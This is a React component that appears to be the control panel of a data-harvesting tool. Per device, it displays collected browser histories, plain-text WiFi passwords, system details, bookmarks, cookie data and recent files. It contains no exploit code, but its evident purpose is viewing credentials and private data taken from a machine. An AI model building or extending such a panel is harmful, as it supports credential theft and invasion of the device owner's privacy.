import { useState, useEffect } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { ArrowLeft, Lock, Download, Monitor, Wifi, Globe, Bookmark, Cookie, FileText, HardDrive, Search, Trash2 } from 'lucide-react';
import axios from 'axios';
import { formatDistanceToNow } from 'date-fns';

const API_URL = import.meta.env.VITE_API_URL || 'http://localhost:8080/api';

function SessionDetail({ onLogout }) {
  const { sessionId } = useParams();
  const navigate = useNavigate();
  const [session, setSession] = useState(null);
  const [loading, setLoading] = useState(true);
  const [activeTab, setActiveTab] = useState('overview');
  const [searchTerm, setSearchTerm] = useState('');

  useEffect(() => {
    fetchSession();
  }, [sessionId]);

  const fetchSession = async () => {
    try {
      const response = await axios.get(`${API_URL}/sessions/${sessionId}`);
      if (response.data.success) {
        setSession(response.data.session);
      }
    } catch (error) {
      console.error('Failed to fetch session:', error);
    } finally {
      setLoading(false);
    }
  };

  const exportSession = () => {
    const dataStr = JSON.stringify(session, null, 2);
    const dataBlob = new Blob([dataStr], { type: 'application/json' });
    const url = URL.createObjectURL(dataBlob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `session_${sessionId}.json`;
    link.click();
  };

  const handleDelete = async () => {
    if (!confirm('Are you sure you want to delete this session? This action cannot be undone.')) {
      return;
    }

    try {
      await axios.delete(`${API_URL}/sessions/${sessionId}`);
      navigate('/dashboard');
    } catch (error) {
      console.error('Failed to delete session:', error);
      alert('Failed to delete session. Please try again.');
    }
  };

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-900">
        <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600"></div>
      </div>
    );
  }

  if (!session) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-900">
        <div className="text-center">
          <h2 className="text-2xl font-bold text-white mb-2">Session Not Found</h2>
          <button onClick={() => navigate('/dashboard')} className="text-blue-400 hover:text-blue-300">
            Back to Dashboard
          </button>
        </div>
      </div>
    );
  }

  const tabs = [
    { id: 'overview', label: 'Overview', icon: Monitor },
    { id: 'chrome', label: 'Chrome History', icon: Globe, count: session.data?.chrome_history?.length },
    { id: 'brave', label: 'Brave History', icon: Globe, count: session.data?.brave_history?.length },
    { id: 'edge', label: 'Edge History', icon: Globe, count: session.data?.edge_history?.length },
    { id: 'wifi', label: 'WiFi Passwords', icon: Wifi, count: session.data?.wifi_passwords?.length },
    { id: 'system', label: 'System Info', icon: HardDrive },
    { id: 'bookmarks', label: 'Bookmarks', icon: Bookmark },
    { id: 'cookies', label: 'Cookies', icon: Cookie },
    { id: 'files', label: 'Recent Files', icon: FileText, count: session.data?.recent_files?.length },
  ];

  const filterHistoryData = (history) => {
    if (!searchTerm || !history) return history;
    return history.filter(item => 
      item.toLowerCase().includes(searchTerm.toLowerCase())
    );
  };

  return (
    <div className="min-h-screen bg-gray-900">
      {/* Header */}
      <header className="bg-gray-800 shadow-sm border-b border-gray-700">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-4">
          <div className="flex justify-between items-center">
            <div className="flex items-center gap-4">
              <button
                onClick={() => navigate('/dashboard')}
                className="p-2 hover:bg-gray-700 rounded-lg transition text-gray-400 hover:text-white"
              >
                <ArrowLeft className="w-5 h-5" />
              </button>
              <div>
                <h1 className="text-2xl font-bold text-white">
                  {session.device_info?.hostname || 'Unknown Device'}
                </h1>
                <p className="text-sm text-gray-400 mt-1">
                  Session: {sessionId} • {formatDistanceToNow(new Date(session.created_at), { addSuffix: true })}
                </p>
              </div>
            </div>
            <div className="flex items-center gap-3">
              <button
                onClick={exportSession}
                className="flex items-center gap-2 px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition"
              >
                <Download className="w-4 h-4" />
                Export
              </button>
              <button
                onClick={handleDelete}
                className="flex items-center gap-2 px-4 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 transition"
              >
                <Trash2 className="w-4 h-4" />
                Delete
              </button>
              <button
                onClick={onLogout}
                className="flex items-center gap-2 px-4 py-2 bg-gray-700 text-white rounded-lg hover:bg-gray-600 transition"
              >
                <Lock className="w-4 h-4" />
                Lock
              </button>
            </div>
          </div>
        </div>
      </header>

      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        {/* Tabs */}
        <div className="bg-gray-800 rounded-lg shadow mb-6 overflow-x-auto">
          <div className="flex border-b border-gray-700">
            {tabs.map((tab) => {
              const Icon = tab.icon;
              return (
                <button
                  key={tab.id}
                  onClick={() => {
                    setActiveTab(tab.id);
                    setSearchTerm('');
                  }}
                  className={`flex items-center gap-2 px-6 py-4 border-b-2 transition whitespace-nowrap ${
                    activeTab === tab.id
                      ? 'border-blue-600 text-blue-400 bg-gray-900'
                      : 'border-transparent text-gray-400 hover:text-white hover:bg-gray-700'
                  }`}
                >
                  <Icon className="w-4 h-4" />
                  {tab.label}
                  {tab.count !== undefined && (
                    <span className="ml-2 px-2 py-0.5 text-xs rounded-full bg-gray-700 text-gray-300">
                      {tab.count}
                    </span>
                  )}
                </button>
              );
            })}
          </div>
        </div>

        {/* Content */}
        <div className="bg-gray-800 rounded-lg shadow p-6">
          {/* Overview Tab */}
          {activeTab === 'overview' && (
            <div className="space-y-6">
              <div>
                <h3 className="text-lg font-semibold text-white mb-4">Device Information</h3>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="border border-gray-700 rounded-lg p-4 bg-gray-900">
                    <p className="text-sm text-gray-400">Hostname</p>
                    <p className="text-lg font-medium text-white">{session.device_info?.hostname || 'N/A'}</p>
                  </div>
                  <div className="border border-gray-700 rounded-lg p-4 bg-gray-900">
                    <p className="text-sm text-gray-400">Username</p>
                    <p className="text-lg font-medium text-white">{session.device_info?.username || 'N/A'}</p>
                  </div>
                  <div className="border border-gray-700 rounded-lg p-4 bg-gray-900">
                    <p className="text-sm text-gray-400">IP Address</p>
                    <p className="text-lg font-medium text-white">{session.device_info?.ip_address || 'N/A'}</p>
                  </div>
                  <div className="border border-gray-700 rounded-lg p-4 bg-gray-900">
                    <p className="text-sm text-gray-400">Status</p>
                    <span className={`inline-flex items-center px-3 py-1 rounded-full text-sm font-medium ${
                      session.status === 'complete' 
                        ? 'bg-green-100 text-green-800' 
                        : 'bg-yellow-100 text-yellow-800'
                    }`}>
                      {session.status}
                    </span>
                  </div>
                </div>
              </div>

              <div>
                <h3 className="text-lg font-semibold text-white mb-4">Collection Summary</h3>
                <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                  <div className="border border-gray-700 rounded-lg p-4 text-center bg-gray-900">
                    <Globe className="w-8 h-8 text-blue-600 mx-auto mb-2" />
                    <p className="text-2xl font-bold text-white">
                      {(session.data?.chrome_history?.length || 0) + 
                       (session.data?.brave_history?.length || 0) + 
                       (session.data?.edge_history?.length || 0)}
                    </p>
                    <p className="text-sm text-gray-400">Browser History</p>
                  </div>
                  <div className="border border-gray-700 rounded-lg p-4 text-center bg-gray-900">
                    <Wifi className="w-8 h-8 text-green-600 mx-auto mb-2" />
                    <p className="text-2xl font-bold text-white">{session.data?.wifi_passwords?.length || 0}</p>
                    <p className="text-sm text-gray-400">WiFi Networks</p>
                  </div>
                  <div className="border border-gray-700 rounded-lg p-4 text-center bg-gray-900">
                    <FileText className="w-8 h-8 text-purple-600 mx-auto mb-2" />
                    <p className="text-2xl font-bold text-white">{session.data?.recent_files?.length || 0}</p>
                    <p className="text-sm text-gray-400">Recent Files</p>
                  </div>
                  <div className="border border-gray-700 rounded-lg p-4 text-center bg-gray-900">
                    <HardDrive className="w-8 h-8 text-orange-600 mx-auto mb-2" />
                    <p className="text-2xl font-bold text-white">{session.items_collected?.length || 0}/8</p>
                    <p className="text-sm text-gray-400">Items Collected</p>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Chrome History Tab */}
          {activeTab === 'chrome' && (
            <div>
              <div className="mb-4">
                <div className="relative">
                  <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
                  <input
                    type="text"
                    placeholder="Search Chrome history..."
                    value={searchTerm}
                    onChange={(e) => setSearchTerm(e.target.value)}
                    className="w-full pl-10 pr-4 py-2 bg-gray-700 border border-gray-600 text-white rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none placeholder-gray-400"
                  />
                </div>
              </div>
              {filterHistoryData(session.data?.chrome_history)?.length > 0 ? (
                <div className="space-y-2 max-h-96 overflow-y-auto">
                  {filterHistoryData(session.data.chrome_history).map((entry, idx) => {
                    const [url, title, visits, time] = entry.split('|');
                    return (
                      <div key={idx} className="border border-gray-700 rounded-lg p-3 hover:bg-gray-700 transition bg-gray-900">
                        <a href={url} target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline font-medium">
                          {title || url}
                        </a>
                        <div className="flex items-center gap-4 mt-1 text-xs text-gray-500">
                          <span>{url}</span>
                          <span>Visits: {visits}</span>
                        </div>
                      </div>
                    );
                  })}
                </div>
              ) : (
                <p className="text-center text-gray-400 py-8">No Chrome history found</p>
              )}
            </div>
          )}

          {/* Brave History Tab */}
          {activeTab === 'brave' && (
            <div>
              <div className="mb-4">
                <div className="relative">
                  <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
                  <input
                    type="text"
                    placeholder="Search Brave history..."
                    value={searchTerm}
                    onChange={(e) => setSearchTerm(e.target.value)}
                    className="w-full pl-10 pr-4 py-2 bg-gray-700 border border-gray-600 text-white rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none placeholder-gray-400"
                  />
                </div>
              </div>
              {filterHistoryData(session.data?.brave_history)?.length > 0 ? (
                <div className="space-y-2 max-h-96 overflow-y-auto">
                  {filterHistoryData(session.data.brave_history).map((entry, idx) => {
                    const [url, title, visits] = entry.split('|');
                    return (
                      <div key={idx} className="border border-gray-200 rounded-lg p-3 hover:bg-gray-50 transition">
                        <a href={url} target="_blank" rel="noopener noreferrer" className="text-blue-600 hover:underline font-medium">
                          {title || url}
                        </a>
                        <div className="flex items-center gap-4 mt-1 text-xs text-gray-400">
                          <span>{url}</span>
                          <span>Visits: {visits}</span>
                        </div>
                      </div>
                    );
                  })}
                </div>
              ) : (
                <p className="text-center text-gray-400 py-8">No Brave history found</p>
              )}
            </div>
          )}

          {/* Edge History Tab */}
          {activeTab === 'edge' && (
            <div>
              <div className="mb-4">
                <div className="relative">
                  <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
                  <input
                    type="text"
                    placeholder="Search Edge history..."
                    value={searchTerm}
                    onChange={(e) => setSearchTerm(e.target.value)}
                    className="w-full pl-10 pr-4 py-2 bg-gray-700 border border-gray-600 text-white rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none placeholder-gray-400"
                  />
                </div>
              </div>
              {filterHistoryData(session.data?.edge_history)?.length > 0 ? (
                <div className="space-y-2 max-h-96 overflow-y-auto">
                  {filterHistoryData(session.data.edge_history).map((entry, idx) => {
                    const [url, title, visits] = entry.split('|');
                    return (
                      <div key={idx} className="border border-gray-700 rounded-lg p-3 hover:bg-gray-700 transition bg-gray-900">
                        <a href={url} target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline font-medium">
                          {title || url}
                        </a>
                        <div className="flex items-center gap-4 mt-1 text-xs text-gray-400">
                          <span>{url}</span>
                          <span>Visits: {visits}</span>
                        </div>
                      </div>
                    );
                  })}
                </div>
              ) : (
                <p className="text-center text-gray-400 py-8">No Edge history found</p>
              )}
            </div>
          )}

          {/* WiFi Tab */}
          {activeTab === 'wifi' && (
            <div>
              {session.data?.wifi_passwords?.length > 0 ? (
                <div className="overflow-x-auto">
                  <table className="min-w-full divide-y divide-gray-700">
                    <thead className="bg-gray-900">
                      <tr>
                        <th className="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase">Network Name</th>
                        <th className="px-6 py-3 text-left text-xs font-medium text-gray-400 uppercase">Password</th>
                      </tr>
                    </thead>
                    <tbody className="bg-gray-800 divide-y divide-gray-700">
                      {session.data.wifi_passwords.map((wifi, idx) => (
                        <tr key={idx} className="hover:bg-gray-700">
                          <td className="px-6 py-4 whitespace-nowrap text-sm font-medium text-white">{wifi.network}</td>
                          <td className="px-6 py-4 whitespace-nowrap text-sm text-white font-mono">{wifi.password}</td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              ) : (
                <p className="text-center text-gray-400 py-8">No WiFi passwords found</p>
              )}
            </div>
          )}

          {/* System Info Tab */}
          {activeTab === 'system' && (
            <div className="space-y-6">
              {session.data?.system_info?.systeminfo && (
                <div>
                  <h3 className="text-lg font-semibold text-white mb-3">System Information</h3>
                  <div className="bg-gray-900 rounded-lg p-4 space-y-2">
                    {session.data.system_info.systeminfo.map((info, idx) => (
                      <p key={idx} className="text-sm text-gray-300 font-mono">{info}</p>
                    ))}
                  </div>
                </div>
              )}
              {session.data?.system_info?.installed_software && (
                <div>
                  <h3 className="text-lg font-semibold text-white mb-3">Installed Software</h3>
                  <div className="space-y-2">
                    {session.data.system_info.installed_software.map((software, idx) => (
                      <div key={idx} className="border border-gray-700 rounded-lg p-3 bg-gray-900">
                        <p className="font-medium text-white">{software.name}</p>
                        <p className="text-sm text-gray-400">Version: {software.version}</p>
                      </div>
                    ))}
                  </div>
                </div>
              )}
              {!session.data?.system_info && (
                <p className="text-center text-gray-400 py-8">No system information found</p>
              )}
            </div>
          )}

          {/* Bookmarks Tab */}
          {activeTab === 'bookmarks' && (
            <div className="space-y-6">
              {session.data?.bookmarks?.chrome?.length > 0 && (
                <div>
                  <h3 className="text-lg font-semibold text-white mb-3 flex items-center gap-2">
                    <Bookmark className="w-5 h-5" />
                    Chrome Bookmarks ({session.data.bookmarks.chrome.length})
                  </h3>
                  <div className="space-y-2">
                    {session.data.bookmarks.chrome.map((url, idx) => (
                      <div key={idx} className="border border-gray-700 rounded-lg p-3 bg-gray-900">
                        <a href={url} target="_blank" rel="noopener noreferrer" 
                           className="text-blue-400 hover:text-blue-300 break-all">
                          {url}
                        </a>
                      </div>
                    ))}
                  </div>
                </div>
              )}
              
              {session.data?.bookmarks?.brave?.length > 0 && (
                <div>
                  <h3 className="text-lg font-semibold text-white mb-3 flex items-center gap-2">
                    <Bookmark className="w-5 h-5" />
                    Brave Bookmarks ({session.data.bookmarks.brave.length})
                  </h3>
                  <div className="space-y-2">
                    {session.data.bookmarks.brave.map((url, idx) => (
                      <div key={idx} className="border border-gray-700 rounded-lg p-3 bg-gray-900">
                        <a href={url} target="_blank" rel="noopener noreferrer" 
                           className="text-blue-400 hover:text-blue-300 break-all">
                          {url}
                        </a>
                      </div>
                    ))}
                  </div>
                </div>
              )}
              
              {session.data?.bookmarks?.edge?.length > 0 && (
                <div>
                  <h3 className="text-lg font-semibold text-white mb-3 flex items-center gap-2">
                    <Bookmark className="w-5 h-5" />
                    Edge Bookmarks ({session.data.bookmarks.edge.length})
                  </h3>
                  <div className="space-y-2">
                    {session.data.bookmarks.edge.map((url, idx) => (
                      <div key={idx} className="border border-gray-700 rounded-lg p-3 bg-gray-900">
                        <a href={url} target="_blank" rel="noopener noreferrer" 
                           className="text-blue-400 hover:text-blue-300 break-all">
                          {url}
                        </a>
                      </div>
                    ))}
                  </div>
                </div>
              )}
              
              {!session.data?.bookmarks?.chrome?.length && 
               !session.data?.bookmarks?.brave?.length && 
               !session.data?.bookmarks?.edge?.length && (
                <p className="text-center text-gray-400 py-8">No bookmarks found</p>
              )}
            </div>
          )}

          {/* Cookies Tab */}
          {activeTab === 'cookies' && (
            <div>
              {session.data?.cookies_info ? (
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  {Object.entries(session.data.cookies_info).map(([key, value]) => (
                    <div key={key} className="border border-gray-700 rounded-lg p-4 bg-gray-900">
                      <p className="text-sm text-gray-400">{key.replace(/_/g, ' ').toUpperCase()}</p>
                      <p className="text-2xl font-bold text-white">{value}</p>
                    </div>
                  ))}
                </div>
              ) : (
                <p className="text-center text-gray-400 py-8">No cookies information found</p>
              )}
            </div>
          )}

          {/* Recent Files Tab */}
          {activeTab === 'files' && (
            <div>
              {session.data?.recent_files?.length > 0 ? (
                <div className="space-y-2">
                  {session.data.recent_files.map((file, idx) => (
                    <div key={idx} className="border border-gray-700 rounded-lg p-3 flex items-center gap-3 bg-gray-900">
                      <FileText className="w-5 h-5 text-gray-400" />
                      <div className="flex-1">
                        <p className="font-medium text-white">{file.name}</p>
                        <p className="text-sm text-gray-400">{file.location}</p>
                      </div>
                    </div>
                  ))}
                </div>
              ) : (
                <p className="text-center text-gray-400 py-8">No recent files found</p>
              )}
            </div>
          )}
        </div>
      </main>
    </div>
  );
}

export default SessionDetail;
